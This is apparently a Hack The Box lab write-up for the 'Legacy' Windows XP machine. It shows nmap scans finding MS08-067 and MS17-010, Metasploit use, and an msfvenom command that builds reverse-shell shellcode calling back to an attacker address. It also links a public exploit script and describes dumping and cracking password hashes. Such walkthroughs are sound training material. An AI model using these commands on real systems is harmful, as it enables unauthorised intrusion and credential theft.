# Legacy

## Overview

Legacy is a pretty straightforward machine which exploits SMB on Windows. This machine showcases CVE-2008-4250 / ms08\_067.

1. [https://nvd.nist.gov/vuln/detail/cve-2008-4250](https://nvd.nist.gov/vuln/detail/cve-2008-4250)
2. [https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250](https://cve.mitre.org/cgi-bin/cvename.cgi?name=cve-2008-4250)
3. [https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15](https://support.microsoft.com/en-us/topic/ms08-067-vulnerability-in-server-service-could-allow-remote-code-execution-ac7878fc-be69-7143-472d-2507a179cd15)

## Enumeration

### Nmap

```bash
sudo nmap -Pn -sV -sC 10.129.1.111 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 10:41 EDT
Nmap scan report for 10.129.1.111
Host is up (0.021s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE  SERVICE       VERSION
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open   microsoft-ds  Windows XP microsoft-ds
3389/tcp closed ms-wbt-server
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m39s, deviation: 2h07m16s, median: 4d22h57m39s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:b9:ec:a3 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2022-03-28T19:39:25+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 51.34 seconds
```

From the Nmap scan, we see that SMB is open and the OS is Windows XP



A handy command that we can run for SMB vulnerability identification is the following:

```bash
sudo nmap --script smb-vuln* -p 445 10.129.1.111
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 10:49 EDT
Nmap scan report for 10.129.1.111
Host is up (0.021s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds

Host script results:
|_smb-vuln-ms10-061: ERROR: Script execution failed (use -d to debug)
| smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
|           
|     Disclosure date: 2008-10-23
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-4250
|_      https://technet.microsoft.com/en-us/library/security/ms08-067.aspx
|_smb-vuln-ms10-054: false
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
|_      https://technet.microsoft.com/en-us/library/security/ms17-010.aspx

Nmap done: 1 IP address (1 host up) scanned in 5.45 seconds
```

The above command shows this machine is vulnerable to 2 SMB vulnerabilities.

## Exploitation with Metasploit

Using the Metasploit module `exploit/windows/smb/ms08_067_netapi`, we'll set up our payload as such:

![](<../../../.gitbook/assets/image (498).png>)

![](<../../../.gitbook/assets/image (493).png>)

{% hint style="info" %}
To set options (e.g. RHOSTS), enter "set RHOST \[target IP]"
{% endhint %}

With this information entered, we can now run the exploit with `run` or `exploit`

![](<../../../.gitbook/assets/image (366).png>)

As shown in the image above, running getuid returns us NT AUTHORITY\SYSTEM which means no privilege escalation is needed as we have the highest privileges on the current system.

## Exploitation without Metasploit

The exploit I used can be found here:

{% embed url="https://raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-067.py" %}

The script explains how to achieve your goal with showing where to make modifications and what commands to run

First I run the msfvenom command mentioned in the code.

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.13 LPORT=443 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f py -v shellcode -a x86 --platform windows
```

![](<../../../.gitbook/assets/image (156).png>)

Then replace the shellcode in the code with the shellcode we just generated.

Running an nmap scan on the target once more with -O (OS Detection) reveals that the target is running Microsoft Windows XP SP3 (94%). With this is mind, we'll trying using this sample command

![](<../../../.gitbook/assets/image (269).png>)

Let's set up a netcat listener and then run the command and you should get a reverse shell.

I've followed these articles, but had no success.

{% embed url="https://0xdf.gitlab.io/2019/02/21/htb-legacy.html#ms-17-010" %}

{% embed url="https://blog.nullprism.io/posts/htb-legacy" %}

## Post Exploitation

One thing we can do with the meterpreter shell is run a hashdump on the target

![](<../../../.gitbook/assets/image (538).png>)

We can then take these hashes and crack them with JohnTheRipper or Hashcat
